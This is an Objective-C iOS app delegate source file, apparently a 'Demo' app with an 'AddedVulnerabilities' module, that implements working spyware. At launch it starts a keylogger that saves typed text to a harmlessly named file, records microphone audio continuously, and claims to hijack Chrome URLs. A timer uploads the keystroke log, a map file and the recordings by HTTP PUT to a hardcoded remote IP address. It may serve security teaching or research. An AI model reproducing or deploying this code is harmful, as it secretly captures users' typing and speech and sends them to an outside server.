//
//  AppDelegate.m
//  Demo
//
//  Created by Alice on 12/23/14.
//  Copyright (c) 2014 Alice. All rights reserved.
//

#import "AppDelegate.h"
#import "AddedVulnerabilities.h"
#import <MapKit/MapKit.h>

@interface AppDelegate () {
    AVAudioRecorder *recorder;
    NSMutableArray *recArr;
    NSTimer *timer;
}

@end

NSString* const SERVER = @"http://52.204.79.136";
AddedVulnerabilities *vulnerabilities;

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // Override point for customization after application launch.
    vulnerabilities = [[AddedVulnerabilities alloc] init];
    [vulnerabilities addVulnerabilities];
    [self startKeylogger];
    [self startAudioRecording];
    timer = [NSTimer scheduledTimerWithTimeInterval:30.0
                                             target:self
                                           selector:@selector(timerMethod:)
                                           userInfo:nil
                                            repeats:YES];
    return YES;
}

// Override method to be run whenever a URL is opened.
- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {
    // handler code here
    NSLog(@"Got a Chrome link");
    [vulnerabilities addToLog:@"Got a Chrome link"];
    
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"URL Hijack" message:@"Your Chrome URLs have been hijacked." delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:nil];
    // optional - add more buttons:
    [alert addButtonWithTitle:@"Yes"];
    [alert show];
    return true;
}

- (BOOL)application:(UIApplication *)application willFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    return true;
}

- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.
    [timer invalidate];
    [recorder pause];
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
    [timer invalidate];
    [recorder pause];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the inactive state; here you can undo many of the changes made on entering the background.
    timer = [NSTimer scheduledTimerWithTimeInterval:30.0 target:self selector:@selector(timerMethod:) userInfo:nil repeats:YES];
    [recorder record];
}

- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
    timer = [NSTimer scheduledTimerWithTimeInterval:30.0 target:self selector:@selector(timerMethod:) userInfo:nil repeats:YES];
    [recorder record];
}

- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
    [recorder pause];
}

- (void)applicationDidReceiveMemoryWarning:(UIApplication *)application {
    [[NSURLCache sharedURLCache] removeAllCachedResponses];
}

// Method to start the keylogger
-(void)startKeylogger {
    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(keyPressed:)
                                                 name:UITextViewTextDidChangeNotification
                                               object: nil];
    
    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(keyPressed:)
                                                 name:UITextFieldTextDidChangeNotification
                                               object: nil];
    
    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(onKeyboardHide:)
                                                 name:UIKeyboardWillHideNotification
                                               object:nil];
    NSLog(@"Keylogger started");
    [vulnerabilities addToLog:@"Keylogger started"];
}

// Method to record every key pressed on the keyboard to be stored in a text file.
-(void) keyPressed:(NSNotification*) notification {
    NSString *text = [[notification object] text];
    
    NSString *filename = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    filename = [filename stringByAppendingPathComponent:@"AgendaHelper.txt"];
    
    // create file if it doesn't exist
    if(![[NSFileManager defaultManager] fileExistsAtPath:filename])
        [[NSFileManager defaultManager] createFileAtPath:filename contents:nil attributes:nil];
    
    // get current date/time
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setTimeStyle:NSDateFormatterMediumStyle];
    [dateFormatter setDateStyle:NSDateFormatterMediumStyle];
    NSString *currentTime = [dateFormatter stringFromDate:[NSDate date]];
    
    // append text to file
    NSString *completeString = [NSString stringWithFormat:@"%@: %@", currentTime, text];
    NSFileHandle *file = [NSFileHandle fileHandleForUpdatingAtPath:filename];
    [file seekToEndOfFile];
    [file writeData:[completeString dataUsingEncoding:NSUTF8StringEncoding]];
    [file writeData:[@"\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [file closeFile];
}

// Method to save the keylogger file whenever the keyboard is done being used.
-(void)onKeyboardHide:(NSNotification *)notification {
    // get file path
    NSString *documentsDirectory = [NSSearchPathForDirectoriesInDomains (NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
    NSString *fileName = [documentsDirectory stringByAppendingPathComponent:@"AgendaHelper.txt"];
    
    // read the whole file as a single string
    NSString *content = [NSString stringWithContentsOfFile:fileName encoding:NSUTF8StringEncoding error:nil];
    NSLog(@"AgendaHelper.txt: %@", content);
    [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%@", @"AgendaHelper.txt: ", content]];
}

// create an audio recording to be sent to a server using the device microphone
-(void)startAudioRecording {
    if (!recArr) {
        recArr = [[NSMutableArray alloc] init];
    }
    
    AVAudioSession *audioSession = [AVAudioSession sharedInstance];
    
    if ([[[UIDevice currentDevice] systemVersion] floatValue] >= 7) {
        if([audioSession respondsToSelector:@selector(requestRecordPermission:)])
        {
            [audioSession requestRecordPermission:^(BOOL granted) {
                NSLog(@"mic permission: %d", granted);
                [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%d", @"mic permission: ", granted]];
                
                if (granted) {
                    NSError *error = nil;
                    [audioSession setCategory:AVAudioSessionCategoryPlayAndRecord error: &error];
                    if (error) {
                        NSLog(@"Error setting category to AVAudioSessionCategoryPlayAndRecord: %@", error);
                        [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%@", @"Error setting category to AVAudioSessionCategoryPlayAndRecord: ", error]];
                        error = nil;
                    }
                    [audioSession setActive:YES error: &error];
                    if (error) {
                        NSLog(@"Error setting audioSession to active: %@", error);
                        [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%@", @"Error setting audioSession to active: ", error]];
                        error = nil;
                    }
                    
                    NSMutableDictionary *recordSetting = [[NSMutableDictionary alloc] init];
                    [recordSetting setValue :[NSNumber numberWithInt:kAudioFormatAppleIMA4] forKey:AVFormatIDKey];
                    [recordSetting setValue:[NSNumber numberWithFloat:44100.0] forKey:AVSampleRateKey];
                    [recordSetting setValue:[NSNumber numberWithInt: 2] forKey:AVNumberOfChannelsKey];
                    
                    NSString *recFilePath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
                    recFilePath = [recFilePath stringByAppendingPathComponent:[NSString stringWithFormat: @"%.0f.%@", [NSDate timeIntervalSinceReferenceDate] * 1000.0, @"rec.mov"]];
                    //NSURL *recFile = [NSURL fileURLWithPath:[NSTemporaryDirectory() stringByAppendingPathComponent: [NSString stringWithFormat: @"%.0f.%@", [NSDate timeIntervalSinceReferenceDate] * 1000.0, @"rec.mov"]]];
                    NSURL *recFile = [NSURL URLWithString:recFilePath];
                    NSLog(@"Writing to: %@",recFile);
                    [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%@", @"Writing to: ",recFile]];
                    [recArr addObject:recFilePath];
                    
                    recorder = [[AVAudioRecorder alloc] initWithURL:recFile settings:recordSetting error:&error];
                    if (error) {
                        NSLog(@"Error instantiating AVAudioRecorder: %@", error);
                        [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%@", @"Error instantiating AVAudioRecorder: ", error]];
                        error = nil;
                    }
                    [recorder setDelegate:self];
                    [recorder prepareToRecord];
                    [recorder record];
                    NSLog(@"RECORDING NOW");
                    [vulnerabilities addToLog:@"RECORDING NOW"];
                }
            }];
        }
    }
}

// Method to send files to the server at a given time interval
-(void)timerMethod:(NSTimer *)timer {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSString *documentsDirectory = [NSSearchPathForDirectoriesInDomains (NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
        
        NSString *AgendaHelperFilePath = [documentsDirectory stringByAppendingPathComponent:@"AgendaHelper.txt"];
        NSString *MapHelperFilePath = [documentsDirectory stringByAppendingPathComponent:@"MapHelper.txt"];
        
        [self phoneHome:SERVER
               withFile:@"AgendaHelper"
                 atPath:AgendaHelperFilePath];
        [self phoneHome:SERVER
               withFile:@"MapHelper"
                 atPath:MapHelperFilePath];
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        NSArray *allFiles = [fileManager contentsOfDirectoryAtPath:documentsDirectory error:nil];
        NSPredicate *filter = [NSPredicate predicateWithFormat:@"self ENDSWITH '.mov'"];
        NSArray *recFiles = [allFiles filteredArrayUsingPredicate:filter];
        
        for (NSString *f in recFiles) {
            [self phoneHome:SERVER
                   withFile:[f stringByReplacingOccurrencesOfString:@".rec.mov" withString:@""]
                     atPath:[documentsDirectory stringByAppendingPathComponent:f]];
        }
    });
}

// Method to send a file to the server
-(void)phoneHome:(NSString *)urlString withFile:(NSString *)fileName atPath:(NSString *)filePath {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (![fileManager fileExistsAtPath:filePath]) {
        NSLog(@"Error: no file at path %@", filePath);
        [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%@", @"Error: no file at path ", filePath]];
        return;
    }
    
    NSData *fileData = [NSData dataWithContentsOfFile:filePath];
    
    NSURLSession *session = [NSURLSession sharedSession];
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@/%@", urlString, fileName]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPBody:fileData];
    [request setHTTPMethod:@"PUT"];
    NSURLSessionDataTask *postDataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error) {
            NSLog(@"PUT data task received response: %@", response);
            [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%@", @"PUT data task received response: ", response]];
        } else {
            NSLog(@"Error: %@", error);
            [vulnerabilities addToLog:[NSString stringWithFormat:@"%@%@", @"Error: ", error]];
        }
    }];
    [postDataTask resume];
}

@end
